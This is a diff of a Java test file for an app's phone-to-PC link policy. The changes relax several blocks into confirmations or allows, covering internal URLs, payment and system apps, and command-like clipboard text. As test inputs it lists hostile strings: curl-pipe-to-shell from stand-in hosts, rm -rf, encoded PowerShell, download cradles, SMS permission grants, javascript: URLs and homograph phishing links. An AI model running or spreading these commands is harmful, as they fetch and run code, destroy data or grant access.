@@ -54,11 +54,11 @@ public class LinkPolicyTest {
         row(t, Cat.SELF_GRANT, S, S, S);
         row(t, Cat.SELF_AUTHORIZE, D, D, D);
         row(t, Cat.UNKNOWN, D, D, D);
-        // [第二轮] 改：手机仍不分档、不确认，但红线保留（用户决定 3）：网址过不了检查就不开（原来断言 127.0.0.1 → ALLOW）
+        // [approve-not-block] 改：手机网址里的 IP / 内网地址不再拒，回到分档之前（第二轮断言 127.0.0.1 → DENY untrusted_url，现在 → ALLOW）（方案 2）
         Facts f = new Facts();
         f.url = LinkPolicy.checkUrl("http://127.0.0.1/", TRUST);
-        assertEquals(Verdict.DENY, LinkPolicy.decide(t, AU, Cat.OPEN_URL, f).verdict);
-        assertEquals(LinkPolicy.R_UNTRUSTED_URL, LinkPolicy.decide(t, AU, Cat.OPEN_URL, f).reason);
+        assertEquals(Verdict.ALLOW, LinkPolicy.decide(t, AU, Cat.OPEN_URL, f).verdict);
+        assertEquals("", LinkPolicy.decide(t, AU, Cat.OPEN_URL, f).reason);
         assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, LinkPolicy.decide(t, AU, Cat.SELF_AUTHORIZE, null).reason);
     }
 
@@ -83,7 +83,8 @@ public class LinkPolicyTest {
         row(t, Cat.RUN_WS_SCRIPT, D, C, C);       // [第二轮] 改：工作区可写档跑工作区脚本 D → C（用户决定 1）
         row(t, Cat.SELF_GRANT, S, S, S);
         row(t, Cat.SELF_AUTHORIZE, D, D, D);       // [插件] 新：远程不能改 OneSay 自己的设置
-        row(t, Cat.SYSTEM_APP_OP, D, D, D);
+        // [approve-not-block] 改：系统程序从「任何档位拒」改成「问你」（只读档照旧拒）（方案 1/3）
+        row(t, Cat.SYSTEM_APP_OP, D, C, C);
         row(t, Cat.UNKNOWN, D, D, D);
         // 两轴本身
         assertEquals(LinkPolicy.Sandbox.WORKSPACE_WRITE, LinkPolicy.Mode.DEFAULT.sandbox);
@@ -111,30 +112,39 @@ public class LinkPolicyTest {
 
     /** [恢复手机] 改：禁止类 / 系统 App 的拦截只在电脑作被控端时生效（手机回到分档之前，由手机端自己的开关把关）。 */
     @Test public void blockedAndSystemAppsAtEveryLevel() {
+        // [approve-not-block] 改：禁止类 / 系统 App 从「任何档位拒（blocked_app / system_app）」改成「问你」——只读档照旧拒（denied_by_level）、
+        // 工作区可写档不操作第三方程序（denied_by_level），其余 CONFIRM；「从不询问」下照旧用原来的原因码拒（方案 1/3）
         for (Target t : new Target[]{Target.PC}) {
             for (Level l : Level.values()) {
                 Facts f = new Facts();
                 f.appBlocked = true;
                 for (Cat c : new Cat[]{Cat.OPEN_APP, Cat.UNINSTALL_APP, Cat.APP_OPERATE}) {
                     Decision d = LinkPolicy.decide(t, l, c, f);
-                    assertEquals(t + " " + l + " " + c, Verdict.DENY, d.verdict);
-                    assertEquals(LinkPolicy.R_BLOCKED_APP, d.reason);
+                    Verdict want = l == RO || (l == AU && c == Cat.APP_OPERATE) ? Verdict.DENY : Verdict.CONFIRM;
+                    assertEquals(t + " " + l + " " + c, want, d.verdict);
+                    if (want == Verdict.CONFIRM) assertTrue(d.kind, d.kind.startsWith("pc.blocked_app."));
+                    else assertEquals(LinkPolicy.R_DENIED_BY_LEVEL, d.reason);
                 }
                 Facts sys = new Facts();
                 sys.appSystem = true;
-                assertEquals(LinkPolicy.R_SYSTEM_APP, LinkPolicy.decide(t, l, Cat.UNINSTALL_APP, sys).reason);
-                assertEquals(LinkPolicy.R_SYSTEM_APP, LinkPolicy.decide(t, l, Cat.APP_OPERATE, sys).reason);
+                assertEquals(l == RO ? Verdict.DENY : Verdict.CONFIRM, LinkPolicy.decide(t, l, Cat.UNINSTALL_APP, sys).verdict);
+                assertEquals(l == FU ? Verdict.CONFIRM : Verdict.DENY, LinkPolicy.decide(t, l, Cat.APP_OPERATE, sys).verdict);
             }
         }
+        Facts nb = new Facts();
+        nb.appBlocked = true;
+        assertEquals(LinkPolicy.R_BLOCKED_APP, LinkPolicy.decide(Target.PC, new LinkPolicy.Mode(LinkPolicy.Sandbox.FULL_ACCESS, LinkPolicy.Approval.NEVER), Cat.OPEN_APP, nb).reason);
         // 系统 App 只是「打开」不算改动
         Facts sys = new Facts();
         sys.appSystem = true;
         assertEquals(Verdict.ALLOW, LinkPolicy.decide(Target.PC, AU, Cat.OPEN_APP, sys).verdict);
-        // [第二轮] 改：手机端支付 / 银行 / 钱包类 App 屏蔽是保留的红线（用户决定 3），原来断言 ALLOW
+        // [approve-not-block] 改：手机端支付 / 银行 / 钱包类 App 从 DENY blocked_app 改成手机上弹确认卡（CONFIRM，可记住）（方案 3）
         Facts blocked = new Facts();
         blocked.appBlocked = true;
-        assertEquals(Verdict.DENY, LinkPolicy.decide(Target.PHONE, AU, Cat.OPEN_APP, blocked).verdict);
-        assertEquals(LinkPolicy.R_BLOCKED_APP, LinkPolicy.decide(Target.PHONE, AU, Cat.UNINSTALL_APP, blocked).reason);
+        assertEquals(Verdict.CONFIRM, LinkPolicy.decide(Target.PHONE, AU, Cat.OPEN_APP, blocked).verdict);
+        assertEquals("phone.blocked_app.open", LinkPolicy.decide(Target.PHONE, AU, Cat.OPEN_APP, blocked).kind);
+        assertEquals(Verdict.CONFIRM, LinkPolicy.decide(Target.PHONE, AU, Cat.UNINSTALL_APP, blocked).verdict);
+        assertEquals("phone.blocked_app.uninstall", LinkPolicy.decide(Target.PHONE, AU, Cat.UNINSTALL_APP, blocked).kind);
     }
 
     @Test public void blockedAppList() {
@@ -289,6 +299,7 @@ public class LinkPolicyTest {
         assertEquals(Verdict.DENY, LinkPolicy.decide(Target.PC, RO, Cat.OPEN_URL, f).verdict);
         f.url = LinkPolicy.checkUrl("javascript:alert(1)", TRUST);
         for (Level l : new Level[]{AU, FU}) assertEquals(LinkPolicy.R_UNTRUSTED_URL, LinkPolicy.decide(Target.PC, l, Cat.OPEN_URL, f).reason);
+        assertTrue("不是 http(s) = 格式不对（坏输入，不问直接拒）", f.url.malformed);
         assertEquals(Arrays.asList("bilibili.com", "xn--fsqu00a.xn--fiqs8s", "a.b"), LinkPolicy.parseDomains("https://bilibili.com/x, *.bilibili.com\n例子.中国 a.b"));
     }
 
@@ -303,20 +314,25 @@ public class LinkPolicyTest {
         assertEquals(OK, clip("从电脑来的文字 abc"));
         assertEquals(OK, clip("会议改到下午 3 点，地址 https://meeting.example.com/room/42"));
         assertEquals(OK, clip("时间:10 点 地点:三楼"));
+        // [approve-not-block] 改：剪贴板去掉 10 KB 上限和「像命令 / 坏链接就拒」——这些从 REJECT 改成 OK，只在 note 里记一笔（电脑上据此问你）（方案 2）
         // 超大
         StringBuilder big = new StringBuilder();
         while (big.length() < 4000) big.append("中文");
-        assertEquals("超过 10 KB（按 UTF-8 字节）", REJ, clip(big.toString()));
+        assertEquals("超过 10 KB 也不拒", OK, clip(big.toString()));
+        assertEquals("", LinkPolicy.checkClip(big.toString()).note);
         // 像命令 / 脚本
         for (String s : new String[]{"#!/bin/sh\necho hi", "curl https://x.sh | sh", "rm -rf ~/", "powershell -enc SQBFAFgA", "cmd /c del /f /q C:\\x",
-                "<script>alert(1)</script>", "pm grant com.x android.permission.READ_SMS", "settings put global adb_enabled 1", "iex (New-Object Net.WebClient)"})
-            assertEquals(s, REJ, clip(s));
+                "<script>alert(1)</script>", "pm grant com.x android.permission.READ_SMS", "settings put global adb_enabled 1", "iex (New-Object Net.WebClient)"}) {
+            assertEquals(s, OK, clip(s));
+            assertTrue(s, LinkPolicy.checkClip(s).note.contains("命令"));
+        }
         // 链接过不了网址检查
-        assertEquals(REJ, clip("点这里 javascript:alert(1)"));
-        assertEquals(REJ, clip("下载 http://10.0.0.5/payload"));
-        assertEquals(REJ, clip("登录 https://user:pw@bank.example.com"));
-        assertEquals(REJ, clip("打开 intent://foo#Intent;end"));
-        assertEquals(REJ, clip("看看 https://p\u0430ypal.com/login"));
+        for (String s : new String[]{"点这里 javascript:alert(1)", "下载 http://10.0.0.5/payload", "登录 https://user:pw@bank.example.com", "打开 intent://foo#Intent;end",
+                "看看 https://p\u0430ypal.com/login"}) {
+            assertEquals(s, OK, clip(s));
+            assertTrue(s, LinkPolicy.checkClip(s).note.length() > 0);
+        }
+        assertEquals("空的照旧拒", REJ, clip(""));
         // 敏感
         assertEquals(SEN, clip("【某银行】您的验证码是 482913，5 分钟内有效"));
         assertEquals(SEN, clip("482913"));
@@ -338,7 +354,10 @@ public class LinkPolicyTest {
         assertEquals(Verdict.CONFIRM, LinkPolicy.decide(Target.PC, AU, Cat.CLIPBOARD_WRITE, f).verdict);
         assertEquals(Verdict.ALLOW, LinkPolicy.decide(Target.PC, FU, Cat.CLIPBOARD_WRITE, f).verdict);
         f.clip = LinkPolicy.checkClip("rm -rf /");
-        assertEquals(LinkPolicy.R_CLIPBOARD_REJECTED, LinkPolicy.decide(Target.PC, FU, Cat.CLIPBOARD_WRITE, f).reason);
+        // [approve-not-block] 改：像命令的剪贴板电脑上从 clipboard_rejected 拒改成问你（完全访问也问；从不询问下照旧 clipboard_rejected）（方案 1/2）
+        assertEquals(Verdict.CONFIRM, LinkPolicy.decide(Target.PC, FU, Cat.CLIPBOARD_WRITE, f).verdict);
+        assertEquals("pc.clipboard.command", LinkPolicy.decide(Target.PC, FU, Cat.CLIPBOARD_WRITE, f).kind);
+        assertEquals(LinkPolicy.R_CLIPBOARD_REJECTED, LinkPolicy.decide(Target.PC, new LinkPolicy.Mode(LinkPolicy.Sandbox.FULL_ACCESS, LinkPolicy.Approval.NEVER), Cat.CLIPBOARD_WRITE, f).reason);
         assertTrue(LinkPolicy.luhn("4111111111111111"));
         assertFalse(LinkPolicy.luhn("4111111111111112"));
     }
@@ -572,7 +591,8 @@ public class LinkPolicyTest {
         assertFalse("没有 Gate / ConfirmBox", rxc.contains("interface Gate") || rxc.contains("ConfirmBox"));
         String ui = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/PcLinkUi.java").toPath()), "UTF-8");
         assertFalse("控制台没有执行级别页", ui.contains("buildLevel(") || ui.contains("打开完全访问？"));
-        assertTrue("电脑上可能要确认的指令手机多等（快捷指令 40 秒保留）", ui.contains("cat == LinkPolicy.Cat.SHORTCUT") && ui.contains("40000"));
+        // [approve-not-block] 改：确认超时 30 → 60 秒，手机这边多等的时间从 40000 改成 60 秒 + 15 秒（MAY_CONFIRM_WAIT_MS）（方案 4）
+        assertTrue("电脑上可能要确认的指令手机多等（快捷指令保留）", ui.contains("cat == LinkPolicy.Cat.SHORTCUT") && ui.contains("MAY_CONFIRM_WAIT_MS = (int) LinkPolicy.CONFIRM_TIMEOUT_MS + 15000"));
         String lp = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/LinkPolicy.java").toPath()), "UTF-8");
         java.util.regex.Matcher lm = java.util.regex.Pattern.compile("\"([^\"\\\\]|\\\\.)*\"").matcher(lp);
         while (lm.find()) assertFalse(lm.group(), lm.group().contains("Bixby") || lm.group().contains("三星"));
@@ -603,7 +623,9 @@ public class LinkPolicyTest {
             if ("支付宝".equals(PcRxPolicy.str(a, "name"))) a.put("package", "com.eg.android.AlipayGphone");
             String pkg = PcRxPolicy.str(a, "package");
             f.appSystem = pkg.startsWith("com.android.");
-            f.appBlocked = f.appBlocked || LinkPolicy.blockedApp(pkg, PcRxPolicy.str(a, "name")) || "com.onesay.assistant".equals(pkg);
+            // [approve-not-block] 桩照 PcRxAndroid 改：OneSay 自己标 appSelf（硬规则），不再算禁止类
+            f.appSelf = "com.onesay.assistant".equals(pkg);
+            f.appBlocked = f.appBlocked || LinkPolicy.blockedApp(pkg, PcRxPolicy.str(a, "name"));
         }
 
         @Override public File workspace() { return ws; }
@@ -658,32 +680,39 @@ public class LinkPolicyTest {
         assertFalse(on.contains("flashlight"));
         h.off.clear();
 
-        // ---- 红线：支付 / 银行 / 钱包类、系统 App
+        // ---- [approve-not-block] 改：支付 / 银行 / 钱包类、系统 App 从 DENY（blocked_app / system_app）改成手机上弹确认卡；
+        //      这个桩没有确认卡界面 = 没人确认 → needs_confirm_timeout，照样没执行（方案 3）；OneSay 自己从 blocked_app 改成硬规则 self_grant_blocked（方案 1②）
         h.ran.clear();
         PcLanClient.Result r = PcRx.handle(h, "open_app", m("name", "支付宝"));
-        assertEquals(LinkPolicy.R_BLOCKED_APP, reasonOf(r));
-        assertEquals(LinkPolicy.R_BLOCKED_APP, reasonOf(PcRx.handle(h, "uninstall_app", m("package", "com.eg.android.AlipayGphone"))));
-        assertEquals("不能远程卸载 OneSay 自己", LinkPolicy.R_BLOCKED_APP, reasonOf(PcRx.handle(h, "uninstall_app", m("package", "com.onesay.assistant"))));
-        assertEquals(LinkPolicy.R_SYSTEM_APP, reasonOf(PcRx.handle(h, "uninstall_app", m("package", "com.android.settings"))));
-        assertEquals("pm 改动 App", LinkPolicy.R_SYSTEM_APP, reasonOf(PcRx.handle(h, "sys_exec", m("command", "pm disable-user com.android.systemui"))));
-        assertEquals("pm 卸载支付类", LinkPolicy.R_BLOCKED_APP, reasonOf(PcRx.handle(h, "sys_exec", m("command", "pm uninstall --user 0 com.eg.android.AlipayGphone"))));
+        assertEquals(LinkPolicy.R_CONFIRM_TIMEOUT, reasonOf(r));
+        assertEquals(LinkPolicy.R_CONFIRM_TIMEOUT, reasonOf(PcRx.handle(h, "uninstall_app", m("package", "com.eg.android.AlipayGphone"))));
+        assertEquals("不能远程卸载 OneSay 自己", LinkPolicy.R_SELF_GRANT_BLOCKED, reasonOf(PcRx.handle(h, "uninstall_app", m("package", "com.onesay.assistant"))));
+        assertEquals(LinkPolicy.R_CONFIRM_TIMEOUT, reasonOf(PcRx.handle(h, "uninstall_app", m("package", "com.android.settings"))));
+        assertEquals("pm 改动 App", LinkPolicy.R_CONFIRM_TIMEOUT, reasonOf(PcRx.handle(h, "sys_exec", m("command", "pm disable-user com.android.systemui"))));
+        assertEquals("pm 卸载支付类", LinkPolicy.R_CONFIRM_TIMEOUT, reasonOf(PcRx.handle(h, "sys_exec", m("command", "pm uninstall --user 0 com.eg.android.AlipayGphone"))));
+        assertEquals("pm 卸载 OneSay 自己", LinkPolicy.R_SELF_GRANT_BLOCKED, reasonOf(PcRx.handle(h, "sys_exec", m("command", "pm uninstall com.onesay.assistant"))));
+        assertTrue("没确认的一条都没执行", h.ran.isEmpty());
         assertTrue("pm 停用普通 App 照常", PcRx.handle(h, "sys_exec", m("command", "pm disable-user com.example.game")).ok);
         assertTrue("普通 App 照常打开", PcRx.handle(h, "open_app", m("name", "微信")).ok);
         assertTrue("系统 App 只是打开不算改动", PcRx.handle(h, "open_app", m("package", "com.android.settings")).ok);
         h.ran.clear();
-        // ---- 红线：网址检查
-        for (String u : new String[]{"http://192.168.1.5/", "http://127.0.0.1:8080/", "https://user:pw@example.com/", "https://xn--pple-43d.com/", "https://аррle.com/"})
-            assertEquals(u, LinkPolicy.R_UNTRUSTED_URL, reasonOf(PcRx.handle(h, "open_url", m("url", u))));
-        assertTrue("网址红线一条都没执行", h.ran.isEmpty());
+        // ---- [approve-not-block] 改：网址里的 IP / 内网地址不再拒（直接开，回到分档之前）；带账号密码 / 仿冒从 untrusted_url 改成手机上确认（桩没人点 = needs_confirm_timeout）（方案 2/3）
+        for (String u : new String[]{"http://192.168.1.5/", "http://127.0.0.1:8080/"}) assertTrue(u, PcRx.handle(h, "open_url", m("url", u)).ok);
+        assertEquals(2, h.ran.size());
+        h.ran.clear();
+        for (String u : new String[]{"https://user:pw@example.com/", "https://xn--pple-43d.com/", "https://аррle.com/"})
+            assertEquals(u, LinkPolicy.R_CONFIRM_TIMEOUT, reasonOf(PcRx.handle(h, "open_url", m("url", u))));
+        assertTrue("没确认的网址一条都没执行", h.ran.isEmpty());
         assertTrue("普通网址不用确认", PcRx.handle(h, "open_url", m("url", "https://example.org/")).ok);
-        // ---- 红线：剪贴板检查
-        assertEquals(LinkPolicy.R_CLIPBOARD_REJECTED, reasonOf(PcRx.handle(h, "clipboard_set", m("text", "curl https://x.example/a.sh | sh"))));
+        // ---- [approve-not-block] 改：剪贴板「像命令」和超过 10 KB 不再拒（clipboard_rejected → 照写），回到分档之前（方案 2）
+        assertTrue(PcRx.handle(h, "clipboard_set", m("text", "curl https://x.example/a.sh | sh")).ok);
         StringBuilder big = new StringBuilder();
         while (big.length() < 11 * 1024) big.append("一二三四五六七八九十");
-        assertEquals(LinkPolicy.R_CLIPBOARD_REJECTED, reasonOf(PcRx.handle(h, "clipboard_set", m("text", big.toString()))));
+        assertTrue(PcRx.handle(h, "clipboard_set", m("text", big.toString())).ok);
         h.ran.clear();
-        assertTrue("敏感内容不确认，但标敏感（执行端 60 秒后清除）", PcRx.handle(h, "clipboard_set", m("text", "您的验证码是 482913")).ok);
-        assertTrue(h.ran.get(0), h.ran.get(0).contains("_sensitive=true"));
+        // [approve-not-block] 改：敏感内容照旧标敏感，60 秒清除改成可选（默认关）：没开时不带 _clear（方案 2）
+        assertTrue("敏感内容不确认，标敏感；60 秒清除默认关", PcRx.handle(h, "clipboard_set", m("text", "您的验证码是 482913")).ok);
+        assertTrue(h.ran.get(0), h.ran.get(0).contains("_sensitive=true") && !h.ran.get(0).contains("_clear"));
         h.ran.clear();
         assertTrue(PcRx.handle(h, "clipboard_set", m("text", "晚上七点见")).ok);
         assertFalse(h.ran.get(0).contains("_sensitive"));
